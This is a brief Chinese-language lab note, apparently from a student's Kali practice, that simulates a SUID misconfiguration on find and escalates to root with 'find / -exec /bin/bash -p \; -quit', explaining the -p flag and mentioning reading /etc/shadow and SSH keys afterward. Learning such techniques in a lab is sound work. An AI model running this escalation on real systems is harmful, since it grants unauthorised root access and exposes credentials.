1.本来想下载并运行经典的提权枚举脚本LinEnum.sh或linux-exploit-suddester.sh，但是我的Kali虚拟机无法解析任何域名，所以使用手动枚举
2.利用SUID（set user ID)是Linux中的一种特殊的文件权限，
因为Kali环境没有SUID漏洞，所以我们自己创建了一个模拟
#1. 临时给find添加SUID（模拟有漏洞的系统）
sudo chmod u+s /usr/bin/find
#2. 现在重新检查
find / -perm -4000 -type f 2>/dev/null | grep find
#3. 你应该能看到 /usr/bin/find 了
#4. 利用这个"漏洞"
find / -exec /bin/bash \; -quit
#5. 实验完成后，恢复原状
sudo chmod u-s /usr/bin/find
但是我在查询的时候发现还是Kali模式，为什么呢？是因为bash发现带有SUID权限的find时，自动丢弃特权，为了解决这个，我们需要使用bash的-p参数（防止特权丢弃）find / -exec /bin/bash -p \; -quit  再使用whoami显示当前用户是root模式，说明我们提权成功啦，接下来就可以使用只有root模式下的命令了
像是查看shadow文件，查看ssh密钥
![[Pasted image 20251208162907.png]]
（12.4.5）